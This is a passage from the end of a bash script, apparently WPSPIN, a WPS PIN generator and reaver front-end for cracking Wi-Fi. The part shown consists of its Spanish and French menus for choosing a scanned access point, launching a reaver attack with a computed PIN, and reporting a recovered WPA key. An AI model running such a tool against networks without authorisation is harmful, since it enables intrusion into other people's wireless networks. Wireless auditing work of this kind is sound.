  if [ "$WALSH_O_WASH" == "wash" ]; then 
    if [ "$LOCK_CHECK" = "No" ]; then
     DISPLAY_LOCKED=$( echo -e "$verde Si$colorbae")
    else
     DISPLAY_LOCKED=$( echo -e "$rojo No$colorbae")  
    fi
  
    if [ "$CHANNEL_CHECK" -lt 10 ]; then
     DISPLY_CHANNEL=$( echo " $CHANNEL_CHECK")
    else
     DISPLY_CHANNEL=$(echo ${CHANNEL[${i}]})
    fi
  fi
   
  if [ "$UNKNOWN" = 1 ]; then
    DISPLAY_PIN=$( echo -e "$orange$PIN$colorbase" )
  else
    DISPLAY_PIN=$( echo -e "$verdefluo$PIN$colorbase" ) 
  fi
  
  if [ "$i" -lt 10 ]; then
    NUM=$( echo -e " $amarillo$i$colorbase")
  else
    NUM=$( echo -e "$amarillo$i$colorbase")
  fi  

  if [ "$WALSH_O_WASH" == "wash" ]; then
    echo -e " $NUM   $blanco$BSSID$colorbase   ${RSSI[${i}]}   ${WPS[${i}]}  $DISPLAY_LOCKED     $DISPLAY_PIN   $DISPLY_CHANNEL    $blanco$ESSID$colorbase "
  else
   echo -e " $NUM    $blanco$BSSID$colorbase         $DISPLAY_PIN        $blanco$ESSID$colorbase  " 
  fi

done

echo ""
echo "--------------------------------------------------------------------------------"
echo ""

read  -p "introducir el número del objetivo: " i
CONFORMITY=$(echo ${#BSSID[@]})
  until [[ "$i" -lt "$CONFORMITY" ]]  &&  [[ "$i" -ge 1 ]]; do
    echo -e "     $magenta ¡OPCIÓN INVALIDA!  $colorbase"
    read  -p "introducir el número del objetivo: " i
  done

BSSID=$(echo ${BSSID[${i}]})
ESSIDSUCIO=$(echo ${ESSID[${i}]})
ESSID="${ESSIDSUCIO%"${ESSIDSUCIO##*[![:space:]]}"}"
CHANNEL=$(echo ${CHANNEL[${i}]})
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8

GENERATE

} 



BIG_MENUE_DISPLAY(){

echo -e "$azulfluo
              _       _  _____    _____   _____  _______  _     _ 
             (_)  _  (_)(_____)  (_____) (_____)(_______)(_)   (_)
             (_) (_) (_)(_)__(_)(_)___   (_)__(_)  (_)   (__)_ (_)
             (_) (_) (_)(_____)   (___)_ (_____)   (_)   (_)(_)(_)
             (_)_(_)_(_)(_)       ____(_)(_)     __(_)__ (_)  (__)
              (__) (__) (_)      (_____) (_)    (_______)(_)   (_)    $colorbase

$amarillo www.crack-wifi.com     www.facebook.com/soufian.ckin2u    www.auditoriaswireless.net$colorbase


"
echo -e "                +----------------------------------------------+  "
echo -e "                |                                              |  "
echo -e "                |  $amarillo   1$colorbase  -$blanco  MODO GUIADO (WASH Y REAVER)$colorbase        |  "
echo -e "                |  $amarillo   2$colorbase  -$blanco  PIN GENERADOR (CON MENU DE ATAQUE)$colorbase |  "
echo -e "                |  $amarillo   3$colorbase  -$blanco  CAMBIAR INTERFAZ$colorbase                   |  "
echo -e "                |  $amarillo   4$colorbase  -$blanco  REINICIAR O CAMBIAR IDIOMA$colorbase         |  "
echo -e "                |  $amarillo   5$colorbase  -$blanco  SALIR$colorbase                              |  "
echo -e "                |                                              |  "
echo -e "                +----------------------------------------------+  "
echo ""
echo ""
read -ep "                               Su elección : " BIG_MENUE_CHOICE

until [[ "$BIG_MENUE_CHOICE" -lt "6" ]]  &&  [[ "$BIG_MENUE_CHOICE" -gt "0" ]]  &&  [[ $BIG_MENUE_CHOICE = *[[:digit:]]* ]]; do
  BIG_MENUE_DISPLAY
done

}




CIAO(){

echo ""
UR=$(whoami) && echo -e "                       Saludos$verdefluo $UR$colorbase , nos vemos en$amarillo lampiweb.com$colorbase "
echo -e "                                   $amarillo   crack-wifi.com$colorbase  y$amarillo auditoriaswireless.net$colorbase  "
echo ""
echo "                        -  (O o)  -         "           
echo "-----------------------ooO--(_)--Ooo--------------------------------------------"


}



ATTACK_MENUE_DISPLAY(){

echo -e "            "
echo -e "            Objetivo >$blanco $ESSID$colorbase mac >$blanco $BSSID$colorbase"
echo -e "            +-------------------------------------------------------+  "
echo -e "            |  $blanco 1$colorbase -$amarillo ATACAR OBJETIVO CON REAVER Y EL PIN $rojo $PIN$colorbase   |  "
echo -e "            |  $blanco 2$colorbase -$amarillo ELEGIR OTRO OBJETIVO$colorbase                            |  "
echo -e "            |  $blanco 3$colorbase <$amarillo VOLVER AL MENÚ ANTERIOR/NUEVO ESCANEO$colorbase           |  "
echo -e "            |  $blanco 4$colorbase -$amarillo REINICIAR/CAMBIAR IDIOMA$colorbase                        |  "
echo -e "            |  $blanco 5$colorbase -$amarillo SALIR $colorbase                                          |  " 
echo -e "            +-------------------------------------------------------+  "
echo ""
echo ""
read -ep "                              Su elección : " ATTACK_MENUE_CHOICE

until [[ "$ATTACK_MENUE_CHOICE" -lt "6" ]]  &&  [[ "$ATTACK_MENUE_CHOICE" -gt "0" ]]; do
  ATTACK_MENUE_DISPLAY
done

}








MON_ADVERTENCIA=$( echo -e "                                        
                 $magenta             ¡ADVERTENCIA! 
$colorbase
$blanco   El único chipset hallado por el sistema es desconocido por airmon-ng
               es probable que escaneo y ataque no funcionen :(  
$colorbase
" )                                                                # warning the user if his chipset is not fully recognized by airmon-ng





INTERFACEDESIGN=$( echo -e "
                    NUMERO      INTERFAZ      CHIPSET
              ---------------------------------------------------   
$blanco")                                                               # up part of the interface selection menue   





WASHWAIT=$( echo -e "                $verdefluo         EFECTUANDO EL SCAN CON WASH $colorbase
$blanco
El PIN por defecto será:
  
  - de color$verdefluo verde$blanco si el punto de acceso esta soportado 
  - de color$orange naranja$blanco si se trata de un routeur desconocido o no soportado $colorbase

$magenta                   CERRAR LA VENTANA DE SCAN PARA LA FASE SIGUIENTE   $colorbase") 






NO_MONITOR_MODE=$(echo -e "$rojo              ADVERTENCIA$colorbase :$amarillo ¡ NO INTERFAZ COMPATIBLE DETECTADA ¡ $colorbase 
$blanco     WPSPIN se ejecutará solo en modo generador (sin escaneo, sin ataque)$colorbase
$blanco          puede redetectar las interfaces con el opción redetectar$colorbase ") 



NO_REAVER=$(echo -e "$rojo        ADVERTENCIA$colorbase :$amarillo ¡ NO SE DETECTO NINGUNA VERSIÓN DE WPS REAVER !  $colorbase 
$blanco      WPSPIN se ejecutará solo en modo generador (sin escaneo, sin ataque)$colorbase
$blanco      Instalar wps reaver para disfrutar de todas las funciones de WPSPIN$colorbase")



FAILED=$(echo -e " 
                       +---.--------------------------------+
                       |    $blanco      Ataque fallido    $colorbase        |
                       +------------------------------------+ 
                       |  $rojo¡NO SE OBTUVO LA CONTRASEÑA WPA!$colorbase  |  
                       +----.-------------------------------+
" )

KEY_FOUND=$(echo -e " 
                      +-------------------------------------+
                      |$verdefluo    ¡SE OBTUVO LA CONTRASEÑA WPA! $colorbase   |
                      +-------------------------------------+
             Resultados guardados en su carpeta WPSPIN en el fichero $colorbase "
 )




STOP_REAVER=$(echo -e " $rojo                 < CTRL + C > PARA PARRAR EL ATAQUE $colorbase "
 )





AIRMON_WARNING=$(echo -e "
 $magenta                     CUIDADO! CHIPSET NO SOPORTADO!

$blanco           No se garantiza el buen funcionamiento de escaneo y ataque    
$blanco  Se recomienda elegir el opción 3 (cambiar interfaz) para cambiar de interfaz$colorbase "
 )





###################################################################################################################################
######################################################## 3 > FRANÇAIS (Else in the if language loop)


else





OUTPUT(){

if [ "$PIN2" == "" ] && [[ "$UNKNOWN" -ne 1 ]]; then

echo -e "------------------------------------------------------"
echo -e "Fabricant        >  $blanco $FABRICANTE  $colorbase"
echo -e "eSSID par défaut >  $blanco $DEFAULTSSID $colorbase"
echo -e "modèle           >  $blanco $MODEL $colorbase" 
echo -e "------------------------------------------------------"
echo -e "        PIN WPS PAR DEFAUT > $amarillo$PIN   $colorbase"
echo -e "------------------------------------------------------"
  if [ "$ACTIVATED" == "1" ] ; then
  echo -e "$verde      WPS ACTIVE PAR DEFAUT! $colorbase" 
  else
  echo -e "Attention :$magenta WPS NON-ACTIVE PAR DEFAUT! $colorbase"
  fi
  if [ "$SPECIAL" == "0" ] ; then
  echo -e "------------------------------------------------------"
  elif [ "$SPECIAL" == "1" ] ; then
  echo -e "------------------------------------------------------"
  echo -e "Attention :$magenta ¡POSSIBLE BLOCAGE DU WPS! $colorbase"
  else
  echo -e "------------------------------------------------------"
  echo -e "$magenta Plusieurs modèles partagent ce début de bssid  $colorbase"
  fi

elif [[ "$PIN2" -gt 1 ]] && [[ "$UNKNOWN" -ne 1 ]]; then

echo -e "------------------------------------------------------"
echo -e "Fabricant        > $blanco $FABRICANTE  $colorbase"
echo -e "eSSID par défaut >  $blanco $DEFAULTSSID $colorbase"
echo -e "modèle           > $blanco $MODEL $colorbase" 
echo -e "------------------------------------------------------"
echo -e "plusieurs PIN possibles > $amarillo$PIN  $PIN2  $PIN3  $colorbase"
  if [[ "$PIN4" -gt 1 ]] ; then
  echo -e " $amarillo $PIN4 $PIN5  $PIN6  $PIN7  $PIN8  $colorbase"
  echo -e "------------------------------------------------------"
  else
  echo -e "------------------------------------------------------"
  fi
    if [ "$ACTIVATED" == "1" ] ; then
  echo -e "$verde      WPS ACTIVE PAR DEFAUT! $colorbase" 
  else
  echo -e "Attention :$magenta WPS NON-ACTIVE PAR DEFAUT! $colorbase"
  fi
  if [ "$SPECIAL" == "0" ] ; then
  echo -e "------------------------------------------------------"
  elif [ "$SPECIAL" == "1" ] ; then
  echo -e "------------------------------------------------------"
  echo -e "Attention :$magenta ¡POSSIBLE BLOCAGE DU WPS! $colorbase"
  else
  echo -e "------------------------------------------------------"
  echo -e "$magenta Plusieurs modèles partagent ce début de bssid  $colorbase"
  fi
else

echo -e "--------------------------------------------------
     $orange  MODELE INCONNU-NON SUPPORTE !   $colorbase
--------------------------------------------------
                  POSSIBLE PIN >$amarillo$PIN $colorbase"
fi

}



DATASGENERADOR(){
echo ""
echo -e "                    -------------------------------------"
echo ""
read -ep "                1 > Introduire eSSID et presser <Enter> : "  ESSID          # essid comme variable               
echo "  "
read -ep "                2 > Introduire bSSID et presser <Enter> : " BSSID           # bssid comme varaible
echo "  "
while !(echo $BSSID | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           # Petit cadeau, de antares_145, suivez son blog sur la web ,le bloc note d'antares,
echo -e " $rojo Erreur de syntaxe : MAC Non Conforme $colorbase"
echo "  "
read -ep "                2 > Introduire bSSID et presser <Enter> : " BSSID 
echo "  "            
done
}




SHORTMENUE(){                                                 # Menu avec fonctionalité réduite )pas de scan, pas d'attaque) auquel sera cantonné l'utilisateur jusqu'à ce 
                                                              # ce 	que mort s'en suive, trois heure du mat je commence à péter un cable, jusqu'à ce que il y ait une
                                                             # interface compatible reconnue 
echo ""
echo "$SORTMENUE_WARNING"
echo ""
echo ""
echo ""
echo -e "                              $orange       ¿   $negro  ?           "
echo -e "                            $verde    ?   $azul    ?      $colorbase        " 
echo -e "                        $blanco       ¿ $colorbase  >X<  $gris  ¿         $colorbase "     
echo -e "                               -  (O o)  -         "
echo -e "                    +---------ooO--(_)--Ooo-------------+   "
echo -e "                    |                                   |   " 
echo -e "                    | $blanco   1$colorbase -$amarillo  GENERATEUR PIN$colorbase            |   "
echo -e "                    | $blanco   2$colorbase -$amarillo  DETECTER INTERFACES$colorbase       |   "
echo -e "                    | $blanco   3$colorbase -$amarillo  SORTIR$colorbase                    |   "
echo -e "                    |                                   |   "
echo -e "                    +-----------------------------------+   "
echo "" 
echo ""
echo ""
echo ""
echo -e ""
read -ep "                              Votre choix : " SHORTMENUE_CHOICE                    

if [ "$SHORTMENUE_CHOICE" == "1" ] ; then

    DATASGENERADOR
    GENERATE
    OUTPUT

echo -e " "
echo -e "      ......pressez <enter> pour continuer......"    # pause to let the user copy the given datas 
read -ep "" NIENTE

   SHORTMENUE  
  
elif [ "$SHORTMENUE_CHOICE" == "2" ] ; then

    IFACE

elif [ "$SHORTMENUE_CHOICE" == "3" ]; then

CLEAN    
CIAO

exit

else

echo -e " ................ $rojo  Option non valide $colorbase........"

 SHORTMENUE
    

fi

}




SELECT_THEIFACE (){
read -ep "                          interface sélectionnée : " i        # ask the user to choose among avlaible interfaces   
}



                                                           # up part of the interface selection menue   


WASH_DISPLAY(){                                    # WE make a break here to be able to just display the results later and because it was confusing for langiages

if [ "$WALSH_O_WASH" == "wash" ]; then


echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco          BSSID         RSSI  WPS  Blocage    PIN    Canal     ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

else

echo "--------------------------------------------------------------------------------"        # devolvemos el resultado reorganizandolo
echo -e "  $blanco           BSSID                 PIN               ESSID  $colorbase"          
echo "--------------------------------------------------------------------------------"
echo ""

fi


for i in ${!BSSID[*]}; do
  
  CHANNEL_CHECK=$(echo ${CHANNEL[${i}]})
  LOCK_CHECK=$(echo ${LOCKED[${i}]})
  BSSID=$(echo ${BSSID[${i}]})
  ESSID=$(echo ${ESSID[${i}]})
  
  GENERATE


if [ "$WALSH_O_WASH" == "wash" ]; then  
  if [ "$LOCK_CHECK" = "No" ]; then
  DISPLAY_LOCKED=$( echo -e "$verde Non$colorbae")
  else
  DISPLAY_LOCKED=$( echo -e "$rojo Oui$colorbae")  
  fi
  
  if [ "$CHANNEL_CHECK" -lt 10 ]; then
  DISPLY_CHANNEL=$( echo " $CHANNEL_CHECK")
  else
  DISPLY_CHANNEL=$(echo ${CHANNEL[${i}]})
  fi
fi  
  
if [ "$UNKNOWN" = 1 ]; then
  DISPLAY_PIN=$( echo -e "$orange$PIN$colorbase" )
  else
  DISPLAY_PIN=$( echo -e "$verdefluo$PIN$colorbase" ) 
fi
  
if [ "$i" -lt 10 ]; then
  NUM=$( echo -e " $amarillo$i$colorbase")
  else
  NUM=$( echo -e "$amarillo$i$colorbase")
fi  

if [ "$WALSH_O_WASH" == "wash" ]; then
  echo -e " $amarillo$NUM$colorbase   $blanco$BSSID$colorbase   ${RSSI[${i}]}   ${WPS[${i}]}   $DISPLAY_LOCKED    $DISPLAY_PIN   $DISPLY_CHANNEL    $blanco$ESSID$colorbase "
else
  echo -e " $NUM    $blanco$BSSID$colorbase         $DISPLAY_PIN        $blanco$ESSID$colorbase  " 
fi

done
echo ""
echo "--------------------------------------------------------------------------------"

echo ""
read  -p "Introduire le numéro de l'objectif : " i
CONFORMITY=$(echo ${#BSSID[@]})
  until [[ "$i" -lt "$CONFORMITY" ]]  &&  [[ "$i" -ge 1 ]]; do
    echo -e "     $rofo OPTION INEXISTANTE  $colorbase"
    read  -p "Introduire le numéro de l'objectif : " i
  done

BSSID=$(echo ${BSSID[${i}]})
ESSIDSUCIO=$(echo ${ESSID[${i}]})
ESSID="${ESSIDSUCIO%"${ESSIDSUCIO##*[![:space:]]}"}"
CHANNEL=$(echo ${CHANNEL[${i}]})
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8

GENERATE

} 



BIG_MENUE_DISPLAY(){

echo -e "$azulfluo
              _       _  _____    _____   _____  _______  _     _ 
             (_)  _  (_)(_____)  (_____) (_____)(_______)(_)   (_)
             (_) (_) (_)(_)__(_)(_)___   (_)__(_)  (_)   (__)_ (_)
             (_) (_) (_)(_____)   (___)_ (_____)   (_)   (_)(_)(_)
             (_)_(_)_(_)(_)       ____(_)(_)     __(_)__ (_)  (__)
              (__) (__) (_)      (_____) (_)    (_______)(_)   (_)    $colorbase

$amarillo www.crack-wifi.com     www.facebook.com/soufian.ckin2u    www.auditoriaswireless.net$colorbase


"
echo -e "                +----------------------------------------------+  "
echo -e "                |                                              |  "
echo -e "                |  $amarillo   1$colorbase  -$blanco  MODE AUTOMATISE (WASH ET REAVER)$colorbase   |  "
echo -e "                |  $amarillo   2$colorbase  -$blanco  PIN GENERATEUR (AVEC MENUE ATAQUE)$colorbase |  "
echo -e "                |  $amarillo   3$colorbase  -$blanco  CHANGER INTERFACE$colorbase                  |  "
echo -e "                |  $amarillo   4$colorbase  -$blanco  REDEMARRER OU CHANGER LANGUE$colorbase       |  "
echo -e "                |  $amarillo   5$colorbase  -$blanco  SORTIR$colorbase                             |  "
echo -e "                |                                              |  "
echo -e "                +----------------------------------------------+  "
echo ""
echo ""
read -ep "                               Votre choix : " BIG_MENUE_CHOICE

until [[ "$BIG_MENUE_CHOICE" -lt "6" ]]  &&  [[ "$BIG_MENUE_CHOICE" -gt "0" ]]  &&  [[ $BIG_MENUE_CHOICE = *[[:digit:]]* ]] ; do
  BIG_MENUE_DISPLAY
done

}



CIAO(){

echo ""
UR=$(whoami) && echo -e "                           A bientôt  $verdefluo $UR$colorbase
                         venez nous rendre visite sur$amarillo crack-wifi.com$colorbase"
echo "         et pour les hispanophones, lampiweb.com et auditoriaswireless.net   "
echo ""
echo "                        -  (O o)  -         "           
echo "-----------------------ooO--(_)--Ooo--------------------------------------------"

}






ATTACK_MENUE_DISPLAY(){

echo -e "               "                            
echo -e "              Objectif >$blanco $ESSID$colorbase mac > $blanco $BSSID $colorbase"
echo -e "              +-----------------------------------------------------+  "
echo -e "              |  $blanco 1 $colorbase -$amarillo ATTAQUER OBJECTIF AVEC REAVER, PIN $rojo $PIN$colorbase |  "
echo -e "              |  $blanco 2 $colorbase -$amarillo SELECTIONER UN AUTRE OBJECTIF$colorbase                |  "
echo -e "              |  $blanco 3 $colorbase <$amarillo RETOURNER AU MENUE ANTERIEUR$blanco /$amarillo NOUVEAU SCAN$colorbase  |  "
echo -e "              |  $blanco 4 $colorbase -$amarillo REDEMARRER$blanco /$amarillo CHANGER DE LANGUE$colorbase               |  "
echo -e "              |  $blanco 5 $colorbase -$amarillo SORTIR $colorbase                                      |  " 
echo -e "              +-----------------------------------------------------+  "
echo ""
echo ""
read -ep "                               Choix : " ATTACK_MENUE_CHOICE
echo ""

until [[ "$ATTACK_MENUE_CHOICE" -lt "6" ]]  &&  [[ "$ATTACK_MENUE_CHOICE" -gt "0" ]]; do
  ATTACK_MENUE_DISPLAY
done

}












WASHWAIT=$( echo -e "                $verdefluo       LE SCAN AVEC WASH EST EN COURS $colorbase
$blanco
Le PIN par défaut proposé apparait:
  
  - en$verdefluo vert$blanco si le point d'accès est supporté 
  - en$orange orange$blanco si le point d'accès est inconnu ou non supporté $colorbase

 $magenta                   FERMEZ LA FENÊTRE DU SCAN POUR L'ARRÊTER $colorbase") 





MON_ADVERTENCIA=$( echo -e "                                        
                 $magenta              ATTENTION 
$colorbase
$blanco  Le système ne détecte qu'un seul chipset et celui-ci n'est malheureusement
     pas complètement compatible, le résultat des options scan et attaque est compromis :(  
$colorbase
" )                                                                # warning the user if his chipset is not fully recognized by airmon-ng


INTERFACEDESIGN=$( echo -e "
                   NUMERO      INTERFACE       CHIPSET
              ---------------------------------------------------   
$blanco")    





NO_MONITOR_MODE=$(echo -e "$rojo          ATTENTION$colorbase :$amarillo AUCUN CHIPSET COMPATIBLE MODE MONITOR DETECTE  $colorbase 
 $blanco   WPSPIN s'exécutera en mode réduit , sans possibilité de scan ni d'attaque$colorbase 
$blanco    Vous pouvez essayer de détecter à nouveau  les interfaces avec l'option 3$colorbase")




NO_REAVER=$(echo -e "$rojo             ATTENTION$colorbase :$amarillo  AUCUNE VERSION DE WPS REAVER DETECTEE  $colorbase 
$blanco  WPSPIN s'exécutera en mode réduit , sans possibilité de scan ni d'attaque$colorbase
$blanco      Vous devez installer reaver pour accéder aux autres fonctions$colorbase")



FAILED=$(echo -e " 
                       +----------------------------------+
                       |   $blanco            Echec    $colorbase          |
                       +----------------------------------+ 
                       |   $rojo   CLEF WPA NON RECUPEREE!$colorbase     |  
                       +----------------------------------+
" )

KEY_FOUND=$(echo -e " 
                      +---------------------------------+
                      |$verdefluo       CLEF WPA RECUPEREE! $colorbase      |
                      +---------------------------------+
             Resultats sauvegardés dans le dossier WPSPIN, voir fichier  $colorbase "
 )




STOP_REAVER=$(echo -e " $rojo                 < CTRL + C > POUR ARRÊTER L'ATTAQUE $colorbase "
 )





AIRMON_WARNING=$(echo -e "
 $magenta                     ATTENTION! CHIPSET NON COMPATIBLE!

$blanco           Le bon fonctionnement du scan et de l'attaque sont compromis    
$blanco          Il est recommandé de choisir l'option 2 (changer d'interface)$colorbase "
 )








fi





#################################################################################################################################################################
#####################################################THAT'S IT, ALL FUNCTIONS ARE DEFINED, NOW START THE REST OF SCRIPT##########################################
################################################################
##############################################################################################
#############################################           2    -   START  , the RESTART, THIS is the script
##############################################################################


IFACE                                             #     We first invocate iface tio check the interface compoatibility
REAVER_CHECK                                      #     And if reaver is installed
BIG_MENUE
exit 0                                                  # if this two parameters arae OK than the user can acsses teh big menue, otherwise he will be limited to short menue



###############################################################################################################################################

#                                                END OF THE SCRIPT                                                                            #

#                          by kcdtv with a big help form my firends anatares_145, 1camaron1 and r00tnuLL                                      #

###############################################################################################################################################

#       www.crack-wifi.com      www.facebook.com/soufian.ckin2u     www.auditorias wireless.net

########################################################################################

#  GENERAL PUBLIC LICENSE VERSION 3

########################################################################################################......
